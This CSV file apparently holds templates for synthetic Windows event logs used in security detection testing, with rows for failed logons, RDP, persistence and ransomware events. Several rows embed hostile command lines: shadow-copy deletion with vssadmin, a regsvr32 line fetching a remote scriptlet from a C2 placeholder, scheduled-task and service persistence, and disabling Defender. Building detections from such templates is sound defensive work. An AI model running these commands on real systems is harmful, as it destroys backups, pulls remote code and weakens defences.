id,source,category,event_group,event_name,severity,action,weight,template,tags,ttp
win_ps_001,windows,powershell,powershell,Suspicious PowerShell ScriptBlock,high,detect,10,"EventID=4104 Provider=""Microsoft-Windows-PowerShell"" HostName=""{hostname}"" User=""{domain}\\{username}"" ScriptBlockText=""{command_line}"" Message=""Suspicious PowerShell script block detected""","windows,powershell","execution"
win_sec_001,windows,security,auth,Windows failed logon,medium,failure,10,"EventID=4625 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" AccountName=""{username}"" AccountDomain=""{domain}"" SourceNetworkAddress=""{src_ip}"" LogonType=3 Status=""0xC000006D"" Message=""An account failed to log on""","windows,auth","credential-access"
win_ran_001,windows,ransomware,impact,Shadow copies deleted,critical,detect,10,"EventID=4688 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" User=""{domain}\\{username}"" NewProcessName=""C:\\Windows\\System32\\vssadmin.exe"" CommandLine=""vssadmin delete shadows /all /quiet"" ParentProcessName=""C:\\Windows\\System32\\cmd.exe""","windows,ransomware","impact"
win_proc_001,windows,process,process,Suspicious process creation cmd,high,create,9,"EventID=4688 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" SubjectUserName=""{username}"" NewProcessName=""C:\\Windows\\System32\\cmd.exe"" CommandLine=""cmd.exe /c whoami /all"" ParentProcessName=""C:\\Windows\\explorer.exe""","windows,process","execution"
win_proc_002,windows,process,process,Suspicious process creation regsvr32,high,create,8,"EventID=4688 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" SubjectUserName=""{username}"" NewProcessName=""C:\\Windows\\System32\\regsvr32.exe"" CommandLine=""regsvr32 /s /n /u /i:http://{c2_domain}/file.sct scrobj.dll"" ParentProcessName=""C:\\Windows\\System32\\cmd.exe""","windows,process,lolbin","defense-evasion"
win_auth_001,windows,security,auth,Successful logon network,low,success,6,"EventID=4624 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" AccountName=""{username}"" AccountDomain=""{domain}"" SourceNetworkAddress=""{src_ip}"" LogonType=3 Message=""An account was successfully logged on""","windows,auth","initial-access"
win_rdp_001,windows,rdp,remote-access,RDP logon success,medium,success,7,"EventID=4624 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" AccountName=""{username}"" AccountDomain=""{domain}"" SourceNetworkAddress=""{src_ip}"" LogonType=10 Message=""Remote Desktop Services: User authentication succeeded""","windows,rdp","lateral-movement"
win_rdp_002,windows,rdp,remote-access,RDP logon failed,high,failure,9,"EventID=4625 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" AccountName=""{username}"" SourceNetworkAddress=""{src_ip}"" LogonType=10 Status=""0xC000006D"" SubStatus=""0xC000006A"" Message=""Remote Desktop Services: User authentication failed""","windows,rdp","credential-access"
win_service_001,windows,service,persistence,New service installed,high,create,8,"EventID=7045 Provider=""Service Control Manager"" HostName=""{hostname}"" ServiceName=""{malware_name}Svc"" ImagePath=""C:\\ProgramData\\{malware_name}.exe"" ServiceType=""user mode service"" StartType=""auto start"" AccountName=""LocalSystem""","windows,service","persistence"
win_def_001,windows,defender,defense,Defender disabled via registry,high,modify,8,"EventID=4657 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" ObjectName=""HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"" ValueName=""DisableAntiSpyware"" NewValue=""1"" SubjectUserName=""{username}""","windows,defender","defense-evasion"
win_task_001,windows,schtasks,persistence,Scheduled task created,high,create,8,"EventID=4698 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" SubjectUserName=""{username}"" TaskName=""\\{malware_name}_Updater"" TaskContent=""schtasks /create /sc minute /mo 30 /tn {malware_name}_Updater /tr C:\\ProgramData\\{malware_name}.exe""","windows,schtasks","persistence"
win_account_001,windows,account-management,privilege,User added to local administrators,critical,add,9,"EventID=4732 Provider=""Microsoft-Windows-Security-Auditing"" HostName=""{hostname}"" SubjectUserName=""{username}"" MemberName=""{domain}\\{username}"" TargetUserName=""Administrators"" Message=""A member was added to a security-enabled local group""","windows,account-management","privilege-escalation"
